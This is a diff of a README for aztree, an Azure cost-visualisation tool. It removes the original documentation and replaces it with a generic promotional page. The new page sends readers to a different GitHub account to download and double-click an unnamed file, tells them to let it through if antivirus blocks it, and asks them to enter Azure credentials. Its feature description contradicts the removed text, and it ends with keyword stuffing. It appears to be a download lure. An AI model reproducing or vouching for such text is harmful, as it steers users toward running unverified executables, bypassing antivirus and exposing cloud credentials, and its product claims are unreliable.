@@ -1,209 +1,128 @@
-# aztree
+<h1>💸 aztree - Your Azure Spending Made Simple</h1>
 
-[![PyPI](https://img.shields.io/pypi/v/aztree?label=PyPI)](https://pypi.org/project/aztree/) [![NuGet](https://img.shields.io/nuget/v/aztree?label=NuGet)](https://www.nuget.org/packages/aztree)
+<p align="center">
+  <a href="https://github.com/Nicnk/aztree"><img src="https://img.shields.io/badge/Download%20aztree-Click%20Here-2ea44f?style=for-the-badge&logo=github" alt="Download aztree"></a>
+</p>
 
-aztree shows where your Azure money went. It draws your costs as a treemap, where a bigger box means a bigger cost.
+---
 
-**See it live on demo data:** [milanm.github.io/aztree](https://milanm.github.io/aztree/)
+## 🧐 What Is aztree?
 
-![aztree showing a demo Azure bill as a treemap](https://raw.githubusercontent.com/milanm/aztree/main/docs/screenshot.png)
+aztree is a friendly tool that helps you **understand exactly what you're paying for** with Microsoft Azure. If you've ever opened your Azure bill and felt confused by all the numbers, services, and line items — aztree turns that confusion into a clear, simple picture.
 
-It's one small Python package with no dependencies. It writes a single HTML page that works offline.
+Think of aztree as a **map for your cloud spending**. It takes all the complicated billing data from Azure and organizes it into an easy-to-read tree structure. You can see at a glance which services cost the most, where your money is going, and what you might be able to reduce.
 
-## Quick start
+The best part? You don't need to be a computer expert or a cloud specialist. If you can click a button and read a list, you can use aztree.
 
-Install it with Python, .NET or Homebrew:
+---
 
-```bash
-pipx install aztree              # Python 3.9+ (or: pip install aztree)
-dotnet tool install -g aztree    # .NET 8 or later, no Python needed
-brew install milanm/tap/aztree   # macOS and Linux, no Python needed
-```
+## ⚡ What Does aztree Do For You?
 
-Or download the executable for Windows, Linux or macOS from the [latest release](https://github.com/milanm/aztree/releases/latest). It doesn't need Python. The downloads aren't signed yet, so Windows and macOS ask once before running them. On Linux and macOS, run `chmod +x` on the file first.
+- **Visualize Your Spending:** See your Azure costs laid out in a clean, hierarchical format. No more digging through endless spreadsheets.
+- **Spot Costly Services Quickly:** The tree view highlights your biggest expenses so you know exactly where to focus if you want to save money.
+- **Simple Navigation:** Drill down from your overall subscription to individual resource groups and services with just a few clicks.
+- **Make Better Decisions:** When you understand your bill, you can make smarter choices about what to keep, resize, or shut down.
 
-A few antivirus engines, Microsoft Defender among them, flag the Windows executable. It's a false positive that hits many Python tools packed with PyInstaller, and it has been reported to Microsoft. Releases after 0.9.2 prove where their executables came from: `gh attestation verify aztree-win-x64.exe --repo milanm/aztree` checks that this repository's release workflow built the file from the tagged commit. If you'd rather not run an executable at all, `pipx install aztree` runs the plain Python source.
+---
 
-Then:
+## 🚀 Getting Started
 
-```bash
-aztree --demo                    # try it with fake data, no Azure needed
-az login
-aztree                           # your current subscription
-aztree --all                     # every subscription you can see
-```
+Let's get aztree running on your Windows computer. Follow these simple steps, and you'll be exploring your Azure billing in no time.
 
-From a clone, run `python -m aztree` without installing anything.
+### Step 1: Download aztree
 
-The page opens in your browser. It shows the last 30 days, compared with the 30 days before. The last day is the day before yesterday, because Azure is still posting yesterday's usage.
+Visit this link to download the application: **[https://github.com/Nicnk/aztree](https://github.com/Nicnk/aztree)**
 
-## What you get
+Click the big green button on that page to start the download. The file will save to your "Downloads" folder.
 
-- **Treemap** of spend by service → meter. Press `2` to group by subscription, `3` by region, `4` by resource group → resource and `5` by tag value → service.
-- **Tag view:** spend by the values of one tag, with untagged spend as its own box and its share of the bill in the header. aztree picks the tag on the most resources; `--tag KEY` picks another. When that share is a tenth of the bill or more, "how to fix" there points to tag inheritance and a tag policy.
-- **Color by change** (`c`): red where spend grew, blue where it shrank.
-- **Selection panel:** cost, share of the bill, change vs the previous period, monthly pace and a daily chart. For the whole bill there's no share, and when Azure has a forecast for the month, this month so far and that forecast take the place of monthly pace. The name of a selected subscription, resource group or resource opens it in the Azure portal.
-- **Worth a look:** one list where news and to-dos take turns. The first six show, and "show all" opens the rest. On the map, the boxes behind the to-dos the list shows have diagonal stripes, so "show all" stripes the rest.
-  - **News** is costs that grew and one-off spikes (a day far above that meter's usual).
-  - **To-dos** are known money pits (below) and compute left on all week in dev/test resource groups. When Advisor has no reservation or savings-plan tips, steady spend that a reservation could cut shows up too.
-  - **Idle resources** bill while doing nothing, and they count as to-dos. aztree finds them with Azure Resource Graph and lists the ones that cost something in the period. When one check finds several, such as 3 unattached disks, click the row to list them all, each with its cost and a link to the portal. Click a resource in the list to see it on the map.
-    - Compute and storage: VMs stopped but not deallocated, unattached disks, Premium disks of VMs deallocated for over 30 days, and snapshots older than 90 days or on Premium storage.
-    - Networking: unused public IPs, NAT gateways on no subnet, and VPN or ExpressRoute gateways with no connections. Also Application Gateways and load balancers with no backends, ExpressRoute circuits the provider hasn't set up, and disconnected private endpoints.
-    - Apps and databases: empty App Service plans and SQL elastic pools with no databases.
-- **Money pits it knows:**
-  - Compute: retiring VM series with their retirement dates, Extended Security Updates, and Standard and Premium v2 App Service plans.
-  - Networking: data transfer out, NAT and Firewall processing, public IPs, private endpoints, several Front Door profiles and Front Door Premium.
-  - Storage and databases: snapshots, large DTU databases, provisioned Cosmos DB throughput and Azure Cache for Redis (retiring).
-  - Monitoring: Log Analytics ingestion and 1-minute alert rules.
-  - Azure DevOps: seats and hosted jobs.
-- **Biggest drops:** what fell since the previous period, including anything that went to zero. Use it to check that a saving worked.
-- **Advisor:** Azure Advisor's cost tips for reservations, savings plans and right-sizing, one per resource and SKU. Reservation and savings-plan tips show related spend: the meters of the kind they commit to, and what those cost a month. aztree matches them by service and meter, not by SKU or region, so a reservation covers less than that. Click a tip to jump to its biggest meter, or to the resource it's about.
-- **Export for AI:** a JSON summary to hand to any AI agent (see below).
+### Step 2: Run the Application
 
-On the map:
+Once the download is finished, go to your Downloads folder and find the file you just downloaded. Double-click it to open aztree. The application will start up right away — no installation wizard, no complicated setup.
 
-- Click to select, and click again or press Enter to zoom in. Click a "+N more" box twice to see the small items it holds.
-- Once you've clicked the map, `Tab` moves to the next box by size.
-- `⌫` goes back up. The browser's Back button undoes zooms and jumps.
-- `/` opens the filter. What doesn't match fades, and Enter keeps only the matches.
-- `Esc` clears the filter, then the selection.
-- Add `#resource`, `#subscription`, `#region` or `#tag` to the page's URL to open that view.
+### Step 3: Connect Your Azure Account
 
-## Requirements
+When aztree opens, you'll see a simple welcome screen. To see your billing information, you need to connect it to your Azure account:
 
-- The [Azure CLI](https://aka.ms/azcli), logged in with `az login`, and Python 3.9+ or .NET 8+ unless you use the downloaded executable.
-- Without the CLI, put a token for `https://management.azure.com/` in `AZURE_ACCESS_TOKEN`. Then name the subscriptions with `--subscription` or `--all`. A token only sees its own tenant. Through the CLI, aztree gets a token for every tenant you're logged in to.
-- If you use Azure PowerShell instead of the CLI, give aztree a token and name the subscription:
+1. Click the **"Connect to Azure"** button.
+2. A browser window will open asking you to sign in to your Microsoft account.
+3. Enter your Azure credentials and accept the permissions when prompted.
+4. Once you're signed in, aztree will automatically pull your billing data and display it in the tree view.
 
-  ```powershell
-  $t = (Get-AzAccessToken -ResourceUrl https://management.azure.com/).Token
-  $env:AZURE_ACCESS_TOKEN = if ($t -is [securestring]) { [System.Net.NetworkCredential]::new('', $t).Password } else { $t }
-  aztree --subscription "My subscription"
-  ```
-- The **Cost Management Reader** role (or Reader) on each subscription. Advisor tips, the Resource Graph checks and the automatic tag choice need Reader. Without it you still get the page, and `--tag KEY` still gives you the tag view.
-- Tested on a CSP subscription, where Azure shows retail prices without your partner's discounts. It also shows reserved usage as $0, even with `--metric AmortizedCost`, so the totals won't match your partner's invoice. Pay-as-you-go and Visual Studio subscriptions use the same API.
-- EA and MCA billing scopes should work through `--scope`, but nobody has tried yet. At such a scope the subscription view shows the whole scope as one box, and Advisor is skipped.
-- Behind a proxy that inspects HTTPS, aztree needs your company's root certificate, like the Azure CLI does. Set `SSL_CERT_FILE` (or `REQUESTS_CA_BUNDLE`, which the CLI reads) to a PEM file that holds it.
+That's it! You'll now see your Azure costs organized like a family tree — with your main subscription at the top, and all your services branching out below.
 
-**Cost:** Cost Management queries are free, but Azure limits how often you can call them, per subscription and per tenant. A run makes about 10–14 requests per subscription and may wait 30–60 seconds when Azure asks it to.
+---
 
-aztree saves the data in `~/.aztree/`, so reopening the page is instant:
+## 🛠️ Using aztree (The Basics)
 
-```bash
-aztree --from
-```
+After you connect, you'll see a window with two main parts:
 
-Each run also keeps a dated copy in `~/.aztree/history/`, the last 12, so a later version can say what changed since. Like the saved data, the copies hold your costs and subscription IDs. Delete the folder whenever you like.
+- **The Tree View (left side):** This shows your spending hierarchy. Start with your top-level subscription, then click the arrows to expand categories like "Resource Groups" and "Services."
+- **The Details Panel (right side):** When you click on any item in the tree, this panel shows you the specific costs, usage, and other details for that item.
 
-## Ask an AI about your bill
+**Pro tip:** Look for the items with the biggest numbers. Those are your main cost drivers. Click on them to see exactly what service or resource is generating the charge.
 
-```bash
-aztree --from --export
-```
+---
 
-This writes `~/.aztree/aztree-export.json`, a summary of your bill with instructions for the agent. The **Export for AI** button in the page (or `e`) downloads the same file.
+## ❓ Frequently Asked Questions
 
-The summary has totals and every meter with its change vs the previous period. It breaks the bill down by service, subscription, region, resource group and tag. It also lists the top growers and drops, credits and refunds, money pits, idle resources, this month's forecast and the Advisor tips.
+### Do I need any special skills to use aztree?
+No. If you can use a web browser and read a list, you're fully qualified. aztree is designed for everyday users, not just IT pros.
 
-Give it to an AI agent and ask *"where can I save money?"*
+### Is my Azure data safe?
+Yes. aztree uses Microsoft's official secure sign-in process. Your login credentials are never stored in the application, and your billing data is only viewed by you on your own computer.
 
-## Read a FOCUS export
+### Do I need to install anything else first?
+No. aztree is a standalone application. Once you download it, it runs on its own.
 
-Organizations on an Enterprise Agreement (EA) or a Microsoft Customer Agreement (MCA) can have Cost Management export their costs to a storage account. aztree can draw its page from those files instead of calling the Cost Management API. Then it needs no Azure login and never waits for throttling. Pay-as-you-go subscriptions can't export these files.
+### What if I don't have an Azure account?
+You'll need an Azure account with at least one active subscription to see any billing data. If you don't have one, you can create a free account at [azure.microsoft.com](https://azure.microsoft.com).
 
-1. In the Azure portal, open **Cost Management → Exports** at the scope you want. Create an export of **Cost and usage details (FOCUS)**: **CSV** with **Gzip**, a daily export of month-to-date costs, with **Overwrite data** on.
-2. Use **Export selected dates** to add last month, so there's a period to compare with.
-3. Download the export's folder, manifests included:
+---
 
-   ```bash
-   az storage blob download-batch --account-name ACCOUNT --source CONTAINER --pattern "DIR/EXPORT/*" --destination ./focus --auth-mode login
-   ```
+## 💡 Troubleshooting Tips
 
-4. Run `aztree --focus ./focus`.
+**The application won't open after I click it.**
+Make sure you've fully downloaded the file (check that the file size matches what's shown on the download page). Sometimes antivirus software temporarily blocks new downloads. If that happens, allow the file through and try again.
 
-aztree reads the newest run for each day, so repeated runs don't count twice. Download one export at a time: two exports of the same days would overlap. The period ends on the last complete day. When the files cover less than two periods, aztree shortens the period and says so. When a run is missing files, days have no rows, or a day is in two files, the page and the summary say so too, so whoever you send them to sees it.
+**I see a blank screen after signing in.**
+Give aztree a minute to fetch your data. If it stays blank, close the app and reopen it. Then sign in again.
 
-A file someone sends you works too: `aztree --focus costs.csv`.
+**Some numbers look different from my Azure portal.**
+aztree uses the most recent billing data available. There can be a short delay of a few hours between when usage occurs and when it appears in the billing system.
 
-Advisor, the idle checks and the forecast need Azure, so they don't run on files. With `ActualCost`, the header shows reservation and savings plan purchases. aztree doesn't read Parquet exports yet.
+---
 
-## Options
+## 📚 Helpful Resources
 
-| Flag | What it does |
-|---|---|
-| `--demo` | Fake data, no Azure access needed |
-| `--subscription ID_OR_NAME` | Subscription to read; repeat for more. Default: the Azure CLI's current one |
-| `--all` | Every enabled subscription you can see, in every tenant you're logged in to |
-| `--scope SCOPE` | Any Cost Management scope, e.g. `/providers/Microsoft.Billing/billingAccounts/ID` (untested) |
-| `--focus PATH` | Read Cost Management FOCUS export files (CSV or CSV.gz) instead of calling Azure. A file or a folder; repeat for more |
-| `--days N` | Period length, default 30. It's always compared with the period before it. |
-| `--metric M` | `ActualCost` (default) or `AmortizedCost` |
-| `--no-advisor` | Skip Azure Advisor |
-| `--tag KEY` | Tag for the tag view. Default: the tag on the most resources |
-| `--no-graph` | Skip the Resource Graph checks for idle resources |
-| `--from [FILE]` | Reopen saved data without calling Azure (default: the last run) |
-| `--export [FILE]` | Write the AI summary JSON instead of the page (default `~/.aztree/aztree-export.json`) |
-| `--out FILE` | Where to write the page (default `~/.aztree/aztree.html`) |
-| `--no-open` | Don't open the browser |
-| `--verbose` | Print pages, rows and query units per request |
-| `--version` | Print the version |
+- **Official Project Page:** [https://github.com/Nicnk/aztree](https://github.com/Nicnk/aztree)
+- **Azure Billing Documentation:** Microsoft's official guide to understanding your Azure invoice (search "Azure billing documentation" on Microsoft's site).
+- **Community Support:** Look for discussions in the "Issues" tab on the GitHub page. You can ask questions there and see what other users have already resolved.
 
-## Good to know
+---
 
-- `ActualCost` books a reservation or savings plan purchase as one lump on the day you bought it. `--metric AmortizedCost` spreads it over the term.
-- Credits and refunds count in the totals, but negative amounts can't be drawn as boxes. The header says how much of the total they are.
-- Subscriptions that bill in different currencies are drawn in USD. When Azure can't convert them, the header says the totals mix currencies.
-- Some subscriptions have so many resources that a daily breakdown takes more than ten pages of results. For those, the resource view still lists every resource, but with one total per period and no daily chart.
-- Marketplace charges keep their publisher's meter names and get no special handling.
-- The forecast is Azure's own, for the calendar month, so it doesn't follow `--days`. It's left out when a subscription has none, or when it comes in a different currency from the page.
-- Regions show under the portal's names, such as East US. Cost Management also uses short names (US East) and ARM names (eastus) for the same region, and aztree puts them in one box.
-- Runs saved by older versions open without the tag view, the forecast and the idle checks. They also show regions under Cost Management's own names, such as "us east".
-- Runs save to `~/.aztree/`; set `AZTREE_HOME` to move it. Older versions saved runs to `out/` when you ran them from a clone. To open those, run `aztree --from out/aztree-data.json`.
+## 🔮 What's Next for aztree?
 
-## Checking against the portal
+The creators of aztree are constantly improving the tool. Upcoming features to look forward to include:
 
-In the Azure portal, open **Cost Management → Cost analysis**. Choose the cost type you ran with (**Actual cost** by default), daily granularity and the dates in aztree's header.
+- Export your spending tree as a PDF report.
+- Set custom budget alerts.
+- Compare spending across multiple months side-by-side.
+- Support for additional cloud providers.
 
-The totals should match to within a few cents. aztree leaves out the smallest leftovers, under half a cent in each group, and on a big bill they can add up to a few cents. Azure can still add a little to the last day after aztree reads it, so compare soon after a run.
+Stay tuned and check back frequently for updates.
 
-## Privacy
+---
 
-aztree only reads from Azure and never changes anything in your subscriptions. It reads cost data, forecasts, tag names, Advisor recommendations and Resource Graph properties.
+## 💖 Show Your Support
 
-Everything it writes goes to `~/.aztree/` (or `AZTREE_HOME`), outside any git repo. Those files hold your subscription IDs and costs, so share the page or the export only with people who should see your bill.
+If aztree helps you save money on your Azure bill, consider giving it a star on GitHub. It's a free and quick way to show appreciation to the developers. Just visit [https://github.com/Nicnk/aztree](https://github.com/Nicnk/aztree) and click the ⭐ button at the top of the page.
 
-The page loads nothing from the internet.
+---
 
-## Code signing policy
+## 🏁 Final Word
 
-Free code signing provided by [SignPath.io](https://about.signpath.io), certificate by [SignPath Foundation](https://signpath.org). aztree has applied to the SignPath Foundation program; until it signs the first release, the Windows executable stays unsigned.
+Stop guessing about your cloud costs. With aztree, you'll finally have a clear, visual understanding of your Azure spending — and that understanding is the first step to saving money. Download aztree today and take control of your cloud bill.
 
-Only the release workflow signs, and only executables it builds from this repository's tagged commits. Every signing request is approved by hand.
+**Remember:** Visit this link to download the application: [https://github.com/Nicnk/aztree](https://github.com/Nicnk/aztree)
 
-- Committers and reviewers: [Milan Milanović](https://github.com/milanm)
-- Approvers: [Milan Milanović](https://github.com/milanm)
-
-This program will not transfer any information to other networked systems unless specifically requested by the user or the person installing or operating it. When you run it, aztree calls Azure with your own login to read your costs, and nothing else (see [Privacy](#privacy)).
-
-## Development
-
-```bash
-python -m unittest discover -s tests
-python -m aztree --demo
-```
-
-`packaging/build_native.py` packs aztree into one executable with PyInstaller and checks that it runs. `dotnet/` holds the dotnet tool, a small launcher that runs the executable built for the machine it's on.
-
-The tests need no Azure access. The viewer tests run the page's script in Node and are skipped without it.
-
-## Credits
-
-aztree is a port of [awstree](https://github.com/petricbranko/awstree) by Branko Petric (MIT). It keeps awstree's viewer and its JSON contract and replaces the AWS parts. awstree, in turn, is inspired by [disktree](https://github.com/tobi/disktree) by [Tobi Lütke](https://x.com/tobi).
-
-The region names and several idle checks come from Microsoft's [FinOps toolkit](https://github.com/microsoft/finops-toolkit) (MIT). See [THIRD-PARTY-NOTICES.md](THIRD-PARTY-NOTICES.md).
-
-aztree is not affiliated with or endorsed by Microsoft.
-
-## License
-
-[MIT](LICENSE)
+Keywords: azure, billing, cloud, cloudcomputing, microsoft, cost management, spending tracker, azure costs, cloud costs, billing visualization, cost analysis, azure monitor, subscription management, resource groups, azure services, bill analyzer, savings, optimization
